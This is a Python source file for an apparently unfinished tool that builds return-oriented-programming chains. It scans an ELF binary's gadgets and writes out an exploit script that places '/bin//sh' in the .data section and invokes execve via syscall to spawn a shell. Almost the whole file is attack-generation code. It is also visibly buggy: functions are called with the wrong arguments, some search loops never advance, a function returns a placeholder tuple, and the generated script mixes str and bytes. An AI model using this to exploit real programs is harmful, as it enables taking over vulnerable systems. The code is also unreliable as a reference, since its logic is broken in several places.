#!/usr/bin/python3

from elftools.elf.elffile import ELFFile
import capstone
import struct
import sys

import general
import print_pretty
import categorize
import get_gadgets



# Takes in 1-instruction GadgetList (general.ALLGADGETS) and name of the vulnerable executable
# This is the driver routine which will chain the rop-gadgets and get execve shellcode
def execveROPChain(GadgetList, vulnExecutable): 

    print("\n\n-->Chaining to get a shell using execve system call")

    fd = open(vulnExecutable, "rb")
    elffile = ELFFile(fd)
    data_section = ".data"
    section = elffile.get_section_by_name(data_section)
    
    # We need .data section's details because we have to write "/bin//sh" into it. 
    data_section_addr = section["sh_addr"]
    data_section_size = section["sh_size"]

    syscallList = categorize.checkIfSyscallPresent(GadgetList)
    intList = categorize.checkIfIntPresent(GadgetList)

    if len(intList) == 0 and len(syscallList) == 0: 
        print("No int 0x80, no syscall, no ROP")
        print("Exiting tool :(")
        sys.exit()
    
    # There are 2 choices here: 
    
    # Choice - 1
    # if syscall is found, 
        # rax <- 59
        # rdi <- Address of "/bin/sh"
        # rsi <- 0
        # rdx <- 0
        # syscall
    if len(syscallList) > 0: 
        case2(GadgetList, data_section_addr)
        sys.exit()

    # Choice - 2
    # if int 0x80 is found, 
        # rax <- 11
        # rbx <- Address of "/bin/sh"
        # rcx <- 0
        # rdx <- 0
        # int 0x80
    elif len(intList) > 0: 
        case1(GadgetList, data_section_addr)
        sys.exit()

    print("--> No syscall / int 0x80 found => ROP Chaining failed")
    sys.exit()


def canWrite(movQwordGadgets, popGadgets):
    for gadget in movQwordGadgets:
        ops = gadget[-2]['operands']
        op1 = ops[0][-4:-1]
        op2 = ops[1]
        f1 = 0
        f2 = 0
        pop1 = None
        pop2 = None
        for popGadg in popGadgets:
            if popGadg[0]['operands'][0] == op1:
                f1 =1
                pop1 = popGadg
                break
        for popGadg in popGadgets:
            if popGadg[0]['operands'][0] == op2:
                f2 =1
                pop2 = popGadg
                break
        if(f1 and f2):
            return [gadget, pop1, pop2] # returns [ mov qword ptr [rega], reb, pop rega, pop regb ] 
    return list()


# If "int 0x80" is present
def case1(GadgetList) : 

    print("Entering case1")

    fd = open("execveChain.py", "w")
    writeHeader(fd)

    raxList = categorize.queryGadgets(GadgetList, general.LOADCONSTG, "rax")
    # print(raxList)
    

    # rax <- 11
    
    # Search for "pop rax; ret"
    x = 0
    while x < len(raxList) : 

        gadget = raxList[x]
        inst = gadget[0]

        if inst['mnemonic'] == "pop" : 
                
            # "pop rax; ret" found. 
            # Steps to be taken: 
                # Put 11 in the payload
                # Execute "pop rax; ret"
               

            # Write it into the file
            fd.write("payload += struct.pack('<Q', 11)")
            fd.write("\t\t# execve's system call number = 11")
            fd.write("\n\t")
            fd.write("payload += struct.pack('<Q', ")
            fd.write(hex(int(inst['address'])))
            fd.write(")")
            fd.write("\t\t# Address of 'pop rax; ret'")
            fd.write("\n\t")
            break
        
        x = x + 1
    
    # Search for "xor rax, rax; ret"
    x = 0
    while x < len(raxList): 
  
        if inst['mnemonic'] == "xor" : 

            # "xor rax, rax; ret" found
            # Jackpot!
            # Steps to do: 
                # Execute "xor rax, rax; ret"
                # Find for arithmetic gadgets which will increase rax's value to 11


            # Write it into the file
            fd.write("payload += struct.pack('<Q', ")
            fd.write(hex(int(inst['address'])))
            fd.write(")")
            fd.write("\t\t# Address of 'xor rax, rax; ret'")
            fd.write("\n\t")

            if changeRegValue(GadgetList, "rax", 0, 11, payload, fd) == 0: 
                print("Unable to find gadgets which can change rax's value")
                print("Exiting...")
                sys.exit()

            break

        # Keep the loop going!
        x = x + 1

    # TODO: Load "/bin//sh" into .data section
    # TODO: Load address of .data into rbx

    # # rcx <- 0
    rcxList = categorize.queryGadgets(GadgetList, general.LOADCONSTG, "rcx")
    print(rcxList)
    rcxList = categorize.queryGadgets(GadgetList, general.MOVREGG, "rcx")
    print(rcxList)
    rcxList = categorize.queryGadgets(GadgetList, general.ARITHMETICLOADG, "rcx")
    print(rcxList)
    x = 0
    while(x < len(rcxList)):
        gadget = rcxList[x]
        inst = gadget[0]
        if inst['mnemonic'] == "pop" :
            # "pop rcx; ret" found. 
            # Steps to be taken: 
                # Put 0 in the payload
                # Execute "pop rax; ret"
                               

            # Write it into the file
            fd.write("payload += struct.pack('<Q', 0)")
            fd.write("\n\t")
            fd.write("payload += struct.pack('<Q', ")
            fd.write(hex(int(inst['address'])))
            fd.write(")")
            fd.write("\n\t")
            break
        x = x + 1

    # # rdx <- 0
    # rdxList = categorize.queryGadgets(GadgetList, general.LOADCONSTG, "rdx")
    # x = 0

    # while(x < len(rdxList)):
    #     gadget = rdxList[x]
    #     inst = gadget[0]
    #     if inst['mnemonic'] == "pop" :
    #         # "pop rcx; ret" found. 
    #         # Steps to be taken: 
    #             # Put 0 in the payload
    #             # Execute "pop rax; ret"
               
    #         # Update payload
    #         payload += struct.pack("<Q", 0)
    #         payload += struct.pack("<Q", int(inst['address']))
                

    #         # Write it into the file
    #         fd.write("payload += struct.pack('<Q', 0)")
    #         fd.write("\n\t")
    #         fd.write("payload += struct.pack('<Q', ")
    #         fd.write(hex(int(inst['address'])))
    #         fd.write(")")
    #         fd.write("\n\t")
    #         break
    #     x = x + 1


# If "syscall" instruction is found: 

# These are the steps to be followed. 
#
# 1. rax <- 59
# 2. Write "/bin//sh" into .data section
# 3. rdi <- .data section's address
# 4. rsi <- 0
# 5. rdx <- 0
# 6. Execute "syscall" instruction

def case2(GadgetList, data_section_addr) : 

    # Open the file where the payload is written in the form of a python script
    fd = open("execveChain.py", "w")
    writeHeader(fd)
    
    # Step-2: Writing "/bin//sh" into .data section
    
    popGadgets = get_gadgets.getPopGadgets(get_gadgets.allGadgets)
    movQwordGadgets = get_gadgets.getMovQwordGadgets(get_gadgets.allGadgets)

    movpopGadgets = canWrite(movQwordGadgets, popGadgets)

    movGadget = movpopGadgets[0][0]
    popGadget1 = movpopGadgets[1][0]
    popGadget2 = movpopGadgets[2][0]
   
    
    # Execute popGadget1 => Reg1 will have .data's address
    fd.write("payload += struct.pack('<Q', ")
    fd.write(hex(int(popGadget1['address'])))
    fd.write(")")
    fd.write("\t\t# Address of pop Reg1; ret")
    fd.write("\n\t")

    # Put .data's address onto stack
    fd.write("payload += struct.pack('<Q', ")
    fd.write(hex(int(data_section_addr)))
    fd.write(")")
    fd.write("\t\t# Address of .data section")
    fd.write("\n\t")

   
    # Execute popGadget2 => Reg2 will have "/bin/sh"
    fd.write("payload += struct.pack('<Q', ")
    fd.write(hex(int(popGadget2['address'])))
    fd.write(")")
    fd.write("\t\t# Address of pop Reg2; ret")
    fd.write("\n\t")

    # Put "/bin//sh" into stack
    fd.write("payload += struct.pack('<Q', ")
    fd.write("0x68732f2f6e69622f")
    fd.write(")")
    fd.write("\t\t# ascii of '/bin//sh'")
    fd.write("\n\t")

    # Execute movGadget - "mov qword ptr[Reg1], Reg2", ret"
    fd.write("payload += struct.pack('<Q', ")
    fd.write(hex(int(movGadget['address'])))
    fd.write(")")
    fd.write("\t\t# Address of pop qword ptr [Reg1], Reg2; ret")
    fd.write("\n\t")

    
    # At this point, payload to write "/bin//sh" is successfully written into execcvevChain.py


    # Step-1: rax <- 59
    raxList = categorize.queryGadgets(GadgetList, general.LOADCONSTG, "rax")

    # Search for "pop rax; ret"
    x = 0
    while x < len(raxList) : 

        gadget = raxList[x]
        inst = gadget[0]

        if inst['mnemonic'] == "pop" : 
                
            # "pop rax; ret" found. 
            # Steps to be taken: 
                # Put 11 in the payload
                # Execute "pop rax; ret"
               

            # Write it into the file
            fd.write("payload += struct.pack('<Q', 59)")
            fd.write("\t\t# execve's system call number = 59")
            fd.write("\n\t")
            fd.write("payload += struct.pack('<Q', ")
            fd.write(hex(int(inst['address'])))
            fd.write(")")
            fd.write("\t\t# Address of 'pop rax; ret'")
            fd.write("\n\t")
            break
        
        x = x + 1
    
    # Search for "xor rax, rax; ret"
    x = 0
    while x < len(raxList): 
  
        if inst['mnemonic'] == "xor" : 

            # "xor rax, rax; ret" found
            # Jackpot!
            # Steps to do: 
                # Execute "xor rax, rax; ret"
                # Find for arithmetic gadgets which will increase rax's value to 11


            # Write it into the file
            fd.write("payload += struct.pack('<Q', ")
            fd.write(hex(int(inst['address'])))
            fd.write(")")
            fd.write("\t\t# Address of 'xor rax, rax; ret'")
            fd.write("\n\t")

            # print("\n\n\nxor rax, rax; ret: ", inst)

            if changeRegValue(GadgetList, "rax", 0, 59, fd) == 0: 
                print("Unable to find gadgets which can change rax's value")
                print("Exiting...")
                sys.exit()

            break

        # Keep the loop going!
        x = x + 1


    # Put "address of .data onto the stack"
    # Execute "pop rsi; ret"

    # fd.write("payload += struct.pack('<Q', ")
    # fd.write(hex(int(data_section_addr)))
    # fd.write(")")
    # fd.write("\t\t# Address of .data section")
    # fd.write("\n\t")

    # # rsi <- 0
    rsiList = categorize.queryGadgets(GadgetList, general.LOADCONSTG, "rsi")
    x = 0
    while(x < len(rsiList)):
        gadget = rsiList[x]
        inst = gadget[0]
        if inst['mnemonic'] == "pop" :
            # "pop rsi; ret" found. 
            # Steps to be taken: 
                # Put 0 in the payload
                # Execute "pop rsi; ret"
                               
            # Write it into the file
            fd.write("payload += struct.pack('<Q', ")
            fd.write(hex(int(inst['address'])))
            fd.write(")")
            fd.write("\t\t# Address of pop rsi; ret")
            fd.write("\n\t")
            
            fd.write("payload += struct.pack('<Q', ")
            fd.write("0")
            fd.write(")")
            fd.write("\n\t")

           
            break
        x = x + 1


    # rdi <- 0
    rdiList = categorize.queryGadgets(GadgetList, general.LOADCONSTG, "rdi")

    x = 0
    while(x < len(rdiList)) : 
        
        gadget = rdiList[x]
        inst = gadget[0]
        if inst['mnemonic'] == "pop" :
            # "pop rdi; ret" found. 
            # Steps to be taken: 
                # Put 0 in the payload
                # Execute "pop rdi; ret"
               
                
            # Write it into the file
            fd.write("payload += struct.pack('<Q', ")
            fd.write(hex(int(inst['address'])))
            fd.write(")")
            fd.write("\t\t# Address of pop rdi; ret")
            fd.write("\n\t")

            fd.write("payload += struct.pack('<Q', ")
            fd.write(hex(data_section_addr))
            fd.write(")")
            fd.write("\t\t# Address of .data section")
            fd.write("\n\t")
            break
        x = x + 1

    # rdx <- 0
    rdxList = categorize.queryGadgets(GadgetList, general.LOADCONSTG, "rdx")
    x = 0

    while(x < len(rdxList)):
        gadget = rdxList[x]
        inst = gadget[0]
        if inst['mnemonic'] == "pop" :
            # "pop rcx; ret" found. 
            # Steps to be taken: 
                # Put 0 in the payload
                # Execute "pop rax; ret"
               

            # Write it into the file
           
            fd.write("payload += struct.pack('<Q', ")
            fd.write(hex(int(inst['address'])))
            fd.write(")")
            fd.write("\t\t# Address of pop rdx; ret")
            fd.write("\n\t")
           
            fd.write("payload += struct.pack('<Q', 0)")
            fd.write("\n\t")
           
            break
        x = x + 1


    # Get syscall
    syscallList = categorize.checkIfSyscallPresent(GadgetList)
    syscallGadget = syscallList[0]
    
    syscallDict = syscallGadget[0]
    syscallAddress = syscallDict['address']
    
    fd.write("payload += struct.pack('<Q', ")
    fd.write(hex(int(syscallAddress)))
    fd.write(")")
    fd.write("\t\t# Address of syscall")
    fd.write("\n\t")

    
    writeFooter(fd)
    print("-->Written the complete payload in execveChain.py")
    print("-->Chaining successful!")



def changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, fd) : 

    # print("Inside changeRegValue")

    RegArithList = categorize.queryGadgets(GadgetList, general.ARITHMETICG, Reg)
    # print(RegArithList)
    # print_pretty.print_pretty(RegArithList)

    # A variable 
    const = 0
    X = 0

    # Search for inc Reg
    # Go through the whole RegArithList and check if inc Reg is present. 

    X = 0
    while X < len(RegArithList) : 
        # print("Inside search for inc Reg")

        gadget = RegArithList[X]
        inst = gadget[0]

        if inst['mnemonic'] == "inc" : 

            if FinalValue > CurrentValue : 
                
                counter = 0
                while counter < (FinalValue - CurrentValue) : 

                    # Execute inc Reg; Ret

                    # Write into file
                    fd.write("payload += struct.pack('<Q', ")
                    fd.write(hex(int(inst['address'])))
                    fd.write(")")
                    fd.write("\t\t# Address of 'inc Reg; ret'")
                    fd.write("\n\t")

                    counter = counter + 1

                return 1
        
        X = X + 1
        
    # Search for dec Reg

    X = 0
    while X < len(RegArithList) : 

        gadget = RegArithList[X]
        inst = gadget[0]
        
        if inst['mnemonic'] == "dec": 

            if FinalValue < CurrentValue : 

                counter = 0
                while counter < (CurrentValue - FinalValue) : 

                    # Execute "dec Reg; ret"

                    # Write into file
                    fd.write("payload += struct.pack('<Q', ")
                    fd.write(hex(int(inst['address'])))
                    fd.write(")")
                    fd.write("\t\t# Address of ''dec Reg; ret'")
                    fd.write("\n\t")

                    counter = counter + 1
                
                return 1
       
        X = X + 1
    
    # Search for "add Reg, 1; ret"

    X = 0
    while X < len(RegArithList) : 

        gadget = RegArithList[X]
        inst = gadget[0]

        if inst['mnemonic'] == "add" : 

            # print("\n\n\nadd rax, 1; ret", inst)

            if inst['operands'][0].isnumeric() : 
                const = int(inst['operands'][0])
            else : 
                const = int(inst['operands'][1])
        
            if const == 1 and FinalValue > CurrentValue : 

                counter = 0
                # print("F - C = ", FinalValue - CurrentValue)
                while counter < (FinalValue - CurrentValue) : 

                    # execute "add Reg, 1; ret"

                    # Write into file
                    fd.write("payload += struct.pack('<Q', ")
                    fd.write(hex(int(inst['address'])))
                    fd.write(")")
                    fd.write("\t\t# Address of 'add Reg, 1; ret'")
                    fd.write("\n\t")

                    counter = counter + 1
                    # print(counter)
                
                return 1
            
        X = X + 1



    # Search for "add Reg, 2; ret"

    
        

            # if const > 1 and FinalValue > CurrentValue :
                
            #     gap = FinalValue - CurrentValue
            #     quo = gap / const
            #     rem = gap % const

            #     while quo > 0 : 

            #         # execute add Reg, const; ret"

            #         # Write into file
            #         fd.write("payload += struct.pack('<Q', ")
            #         fd.write(hex(int(inst['address'])))
            #         fd.write(")")
            #         fd.write("\n\t")
                    
            #         quo = quo - 1

            #         CurrentValue = CurrentValue + const

            #     if FinalValue == CurrentValue: 
            #         return 1

            #     if changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, payload, fd) == 0: 
            #         print("Unable to find gadgets which can change rax's value")
            #         print("Exiting...")
            #         sys.exit()
                
            #     else : 
            #         return 1

            # if const == -1 and FinalValue < CurrentValue: 
                
            #     counter = 0
            #     while counter < CurrentValue - FinalValue : 

            #         # execute "add Reg, -1; ret"

            #         # Write into file
            #         fd.write("payload += struct.pack('<Q', ")
            #         fd.write(hex(int(inst['address'])))
            #         fd.write(")")
            #         fd.write("\n\t")
                    
            #         counter = counter + 1
                
            #     return 1
            
            # if const < -1 and FinalValue < CurrentValue : 
    
            #     gap = CurrentValue - FinalValue
            #     quo = gap / (-(const))
                    
            #     while quo > 0: 

            #         # execute "add Reg, -ve number; ret"

            #         # Write into file
            #         fd.write("payload += struct.pack('<Q', ")
            #         fd.write(hex(int(inst['address'])))
            #         fd.write(")")
            #         fd.write("\n\t")
                            
            #         quo = quo - 1

            #         CurrentValue = CurrentValue + const
                
            #     if FinalValue == CurrentValue : 
            #         return 1
                
            #     if changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, payload, fd) == 0: 
            #         print("Unable to find gadgets which can change rax's value")
            #         print("Exiting...")
            #         sys.exit()
                
            #     else : 
            #         return 1
            
        # TODO: Do the same for sub instruction
        # Take care of recursive calls properly.

        # main while loop
        # Keep it going!


    return ("qwwe", "123")


def writeHeader(fd) : 

    fd.write("#!/usr/bin/env python3")
    fd.write("\n\n")
    fd.write("import struct")
    fd.write("\n\n")
    fd.write("if __name__ == '__main__' : ")
    fd.write("\n\n\t")
    fd.write("# Enter the amount of junk required")
    fd.write("\n\t")
    fd.write("payload = ''")
    fd.write("\n\n\t")

def writeFooter(fd): 

    fd.write("\n\t")
    fd.write("fd = open('payload.txt', 'wb')")
    fd.write("\n\t")
    fd.write("fd.write(payload)")
    fd.write("\n\t")
    fd.write("fd.close()")    
    fd.write("\n\t")
    fd.close()






        
    
    
    
    
